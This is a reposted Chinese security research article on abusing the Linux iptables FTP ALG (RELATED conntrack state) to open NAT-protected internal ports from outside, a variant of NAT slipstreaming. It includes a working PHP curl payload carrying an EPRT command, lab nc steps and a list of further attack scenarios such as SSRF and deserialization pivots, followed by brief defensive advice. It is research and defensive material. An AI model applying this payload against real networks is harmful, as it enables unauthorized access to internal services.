0x00 前言  

去年看了portswigger的top-10-web-hacking-techniques-of-2020-nominations-open文章，里面列举了2020年比较热门的技术，非常有意思，地址是（https://portswigger.net/research/top-10-web-hacking-techniques-of-2020-nominations-open）。在一系列前沿技巧中我看到了这篇（https://samy.pl/slipstream/）

![](https://raw.staticdn.net/lper/document/master//img/nat-slipstreaming.png)

NAT我知道，就是动态网络地址转换端口映射啥的嘛，防火墙隔绝内外网的基本功能之一。slipstreaming是什么玩意？

![Image](https://raw.staticdn.net/lper/document/master//img/slipstream.png)

好屌啊，nat低压气穴，那我这么中二肯定要看看的。第一遍初看，没看懂，只知道从外网把受nat保护的内网端口给暴露出来了，第二遍第三遍也大概看懂了一个流程，没有深究，一直拖到现在重新研究。最近实在不知道干嘛了，前几天又和rr提了一嘴，那rr毕竟牛逼啊，经过rr的指点我可不得直接深入研究，于是有了下文。  

0x01 知识背景
---------

由于比较复杂，概念太多我自己也没有特别搞得懂，我这边先罗列几篇背景知识文章供读者先看看，就不在赘述了。nat slipstream作者的官网：https://samy.pl/slipstream/ 奇安信攻防社区也有发过简单介绍这块的文章：https://forum.butian.net/share/88 github上2009年的文章：https://github.com/rtsisyk/linux-iptables-contrack-exploit 主要模块nf_conntrack的扫盲贴：https://clodfisher.github.io/2018/09/nf_conntrack/

我知道很多人都不会看，所以我大概简单介绍一下好了。首先，在典型的防火墙iptables里有一个很常见的配置

```
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  

```

可以认为是放行input方向标记为ESTABLISHED状态的tcp链接，这种配置甚至在ubuntu官网都能找到（https://help.ubuntu.com/community/IptablesHowTo）

![Image](https://raw.staticdn.net/lper/document/master//img/ubuntu-tcp-input.png)

这也说明了这两条配置的常见性和广泛性，ESTABLISHED我们应该都能理解，就是tcp链接已经建立后的状态，已经建立完成的链接自然是可以从input方向进来的，这种链接常见于从内向外发起后的tcp链接。那么这里还有一个RELATED状态是什么呢？这个状态主要是给ALG类协议使用的，通常ALG类协议会有两个工作端口（典型如FTP），一个端口负责控制一个端口负责操作其他，而RELATED状态就是标记ALG类协议的两条TCP链接之间存在关联性，也就是说如果有一条TCP链接被标记为和另外一条相关联，那么他就可以从外部直接访问到内部。关于ALG的wiki解释如下：

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下面还有一个比较详细的表来描述这个东西

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

关于利用ALG类协议在NAT上任意映射端口使外部发起的链接可以直接访问内部的端口，这一块的利用可以追溯到2010年之前，可以说是历史悠久。nat slipstream的作者在最新的文章里利用的是SIP协议，当然在很多年前他也利用过FTP。这里简单叙述一下SIP的利用思路：  

1.  找到支持SIP的防火墙环境
    
2.  通过投递恶意页面到内网，受害者打开恶意页面
    
3.  恶意页面的js对外发送post请求
    
4.  请求通过防火墙时候，由于MTU对包体进行了分片，post体中的一部分被防火墙识别成了SIP
    
5.  被识别成SIP协议后防火墙就会触发RELATED规则导致外部可以访问指定内部端口

0x02 FTP ALG
------------

我不像作者那样利用SIP，因为我觉得不太好找支持SIP的（感觉），所以回到远古的FTP上来。为了了解iptables对FTP的检测逻辑，我翻了很多资料，就不展开讲了。直接给出答案即可。我们先来了解一下FTP的ALG支持的必须条件：

1.  需要有nf_conntrack模块
    
2.  需要有nf_conntrack_ftp模块
    
3.  需要配置input方向的related规则

nf_xxx是Linux内核模块，对链接的状态标记是由内核模块完成的，所以我们必须先知道系统有没有默认加载模块。比如下面是ubuntu20

![Image](https://raw.staticdn.net/lper/document/master//img/lsof_nf_xxx.png)

可以看到已经把nf_conntrack_ftp默认去掉了，所以ftp的ALG默认是不支持的。而老一些Linux系统一般都会默认加载，比如

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当然也不见得新的系统就一定不会有，要知道ubuntu20是桌面系统没有默认加载是正常的，而大部分防火墙不仅仅系统可能较老，而且出于功能性考虑肯定也会大概率加载，所以非常普遍可以认为基本都有。关于FTP的主动被动模式我就不介绍了，一点不了解的可以简单看看（https://www.cnblogs.com/mawanglin2008/articles/3607767.html）。了解这些前提后，我们来了解一下FTP的一般命令，这里主要看主动模式：  

```
USER admin  
PASS admin  
PORT 127,0,0,1,0,22  

```

一目了然不做过多介绍，这里主要看port这个命令，这个命令由客户端发出，通过防火墙后防火墙会记录下来，然后进行前面说的映射。这里我直接用奇安信社区的一篇文章的图来描述这个过程：

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

port指令前面四位是ip一看便知，后面两位其实是端口号的高位和低位，举个例子，比如端口号8848要获得其高低位，先转化成十六进制变为0x2290，然后获得高位0x22和低位0x90，再分别转成十进制最终得到34,144。这样如果我们要映射127.0.0.1上的8848就写成`PORT 127,0,0,1,34,144`即可。我知道这很麻烦，也不直观，所以我现在介绍一个和他等效的命令来代替他：  

```
EPRT |1|127.0.0.1|8848|  

```

这个可以认为作为payload是和port等效的即可。一目了然也便于反复修改做实验。

0x03 初步尝试
---------

大概概念雏形有了，我们整理一下：

1.  寻找一种方法，从内部发送非加密TCP链接经过防火墙到外部
    
2.  防火墙匹配到关键命令后根据命令的内容生成相关映射
    
3.  从外部发起请求到防火墙上临时允许的端口上

当然这只是雏形，实际情况要比这个复杂很多，我们一步步来。第一步最容易想到的场景就是SSRF，还有投递恶意页面。这里我主要以SSRF作为先决条件，那么假设我有一个SSRF漏洞可以让我从内部发起请求到外部。接下来的核心问题就是防火墙的匹配逻辑和我的SSRF限制条件之间的场景磨合问题。如果防火墙的匹配规则比较弱智，那么我的SSRF限制条件越多对我来说场景越普遍，因为通常我们获得的SSRF可能就只有一个限定协议的GET请求。结合nf_conntrack_ftp的匹配逻辑的部分代码以及实验，我得出了几个隐藏的条件：

1.  必须保持发起的链接状态保持在ESTABLISHED，也就是链接保持住
    
2.  发起的请求必须被拆分成两次
    
3.  命令必须在TCP PAYLOAD的开头
    
4.  PORT或者EPRT命令必须在非第一次请求里
    
5.  并不需要其他命令，但必须要有第一次请求体
    
6.  请求端口必须是21

什么叫一个链接里必须拆分成两次请求呢？我们都知道有个东西叫做长链接，多个http请求可以在一个tcp长链接里进行请求和响应，那么这里可以类比成这个，只不过不一定是http。更具体的说如下图：

![Image](https://raw.staticdn.net/lper/document/master//img/long-http-tcp.png)

两次包的tcp flag的push位置必须置为1才算一次，两个push才算两次。这里也尝试过前面那个作者的tcp分片，尝试了对http报文使用tcp分片来达到分包效果，然而似乎防火墙并不吃这一套。

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![Image](https://raw.staticdn.net/lper/document/master//img/inter-head-info.png)

上图就是tcp分片的实验截图，并没有用，各位可以自己抓包看一下tcp分片的两个包第一个包并没有标记push所以两个分片被视为一个包。由于HTTP分包不能用，如果需要满足上面列举的几个条件在常见的SSRF协议里几乎很难做到。我分别尝试了以下几个方案：  

1.  gopher：不可行，gopher虽然以tcp形式构造任意payload但是不能保持链接，更不能一个链接里发送两次push，更多细节就不赘述了太复杂
    
2.  30x条转：更不可行，无论是http的还是其他协议都尝试畸形30x跳转，然而实际情况是30x跳转是以关闭当前链接，创造新的链接的方式进行的，就算是满足了同一个链接也控制不了payload使得其中一个以PORT开头，要知道http的协议开头都是GET和POST等
    
3.  pipeline：没有场景，正向pipeline是可以的，但是由内而外的pipeline几乎不可能存在
    
4.  http走私：暂时没想出来可行性，感觉可以但是实际上应该是不行，因为防火墙识别报体的push次数和http的长度、trunk这些不一样

0x04 柳暗花明
---------

在瞎几把尝试的时候，我使用了一个命令来模拟http发包：

```
curl -X POST -T x.txt http://xxx.xxx.xxx.xxx:21  

```

结果居然成功了，一开始我以为是分片成功了，后来仔细看抓包感觉不太对劲

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（这个截图我没有用分片所以没有看到分片的包）注意看划线的部分，可以看到一个post被拆分成两个请求报体，我们看一下是不是push位置都是1

![Image](https://raw.staticdn.net/lper/document/master//img/post-body-info.png)

![Image](https://raw.staticdn.net/lper/document/master//img/post-body-info1.png)

确实都是1，太神奇了，这是怎么回事呢？我仔细看了看报文，发现post请求头里有这个

![Image](https://raw.staticdn.net/lper/document/master//img/post-body-info2.png)

```
Expect: 100-continue  

```

这是什么？百度一下（https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/100）

![Image](https://raw.staticdn.net/lper/document/master//img/100-continue.png)

意思就是客户端先发出头部体暂时不发送post body，头部里加入Expect，如果服务器响应说我现在准备好接受post body了，然后客户端再单独发送post body。这就直接造成了两次push在一次tcp链接里！完美契合我们的需求！希望有了，可是问题又来了，哪个服务端在实现SSRF的时候会使用  

```
curl -X POST -T x.txt http://xxx.xxx.xxx.xxx:21  

```

这样的形式来发送呢？怕是脑残才会这样写吧。那这玩意真的就没有地方用吗？答案是有的！远在天边，近在眼前！我们看一下php的curl的实现，搜一搜找到下面的线索：https://gist.github.com/perusio/1724301

![Image](https://raw.staticdn.net/lper/document/master//img/curl-post-info.png)

什么？php的curl在发送post体超过1024个字节的时候会使用expect？？？？？我爱php！马上验证尝试，结果是自然的，有一说一，确实是这样的。那么我们开始构造一个满足要求的post体：  

1.  body大于1024个字节
    
2.  以命令开头
    
3.  加入一些小细节能被防火墙正确识别 直接给出php的demo

```
<?php  
for ($i=0; $i < 1; $i++) {  
echo "$i";  
request("http://172.28.64.142:21");  
}  
function request($url)  
{  
    $requestData = "EPRT |1|172.28.64.19|8848|\r\n\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, $url);  
    curl_setopt($ch, CURLOPT_POST, 1);  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    curl_setopt($ch, CURLOPT_POSTFIELDS, $requestData);  
    $data = curl_exec($ch);  
    curl_close($ch);  
}  
  
?>  

```

好了，现在我们能发出被防火墙识别到触发映射规则的http报文了。

0x05 实验观察
---------

这里我建议先准备两个虚拟机，一台模拟外网主机，一台模拟内部主机，然后在内部主机上配上防火墙策略

```
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -P INPUT DROP  

```

然后我们在内网的主机里执行前面的php文件模拟对外发包，发包到我们的外网服务端上（外部服务端要怎么写我就不放出来了，有一些小细节留给大家自己写吧）。在发包之前，我们可以在内网的主机上监听任意一个端口

```
nc -l 0.0.0.0:10000  

```

接着在外网的主机上尝试去直接链接

```
nc -vv xxxxx 10000  

```

会发现怎么都连不上，连不上才是正常的。接着开启发包，发送一个post请求，接着再次在外部主机上尝试链接，会发现连接成功！

![Image](https://raw.staticdn.net/lper/document/master//img/nc-vv.png)

这里有个细节就是一次连接成功后断开再次尝试的时候会发现又连不上了，这才是正常的。一个发包只能映射一次。  

0x06 拓展攻击面
----------

前面只是演示了一个可能的场景，但其实还可以延伸出其他可能的场景。比如：

1.  恶意页面这块也可以再尝试一下，部分资料显示有些浏览器在特定情况下也会拆分请求，另外用户在内部浏览页面的话走的pipeline，可能利用这一点也能达成目的
    
2.  服务端的websocket服务，如果会把我的请求放在响应当中，可能可以构造命令激活防火墙，我可以把我的发起端口改成21端口，如果防火墙在判断的时候不计较发起方向的话？
    
3.  反序列化的时候，类似的发出一个可控ssrf或者是打出一个tcp链接到外部恶意服务器比如jdbc？
    
4.  有限getshell的情况下可以自己来触发映射，比如直接对外请求或者shell里直接打命令通过shell传输显示来触发映射等等，如果你的内网限制跳板，那么通过触发花式nat映射，可能可以将外网作为跳板访问当你本来访问不到的服务器
    
5.  不仅仅是外网的nat，内网的多个nat，也可以尝试花式触发
    
6.  其他ALG协议也有潜在的能力 有人会问，我都有SSRF了我直接打内网不就好了，我映射个啥劲？我只能说，想象力局限了，至于差别在哪里，各位可以自己在深入理解一下。

0x07 如何防御
---------

其实我觉得不太好防御，最暴力的方式就是直接干掉related状态，一般情况下是用不到的，尤其是在一些比较严格的网络环境下自然是用不到的。用到的地方通常是比较随意的、便利为主的网络环境，所以在配置这个状态规则时还是要分清楚实际场景需要，而不是抄文档。另外下面是我找到的关于这一块的安全加固的文章，也可以参考一下 https://home.regit.org/netfilter-en/secure-use-of-helpers/


---------

>本文转自漂亮鼠，  [原文地址：https://mp.weixin.qq.com/s/KPHU8D_bC_zjD5LmyDWL_g](https://mp.weixin.qq.com/s/KPHU8D_bC_zjD5LmyDWL_g)
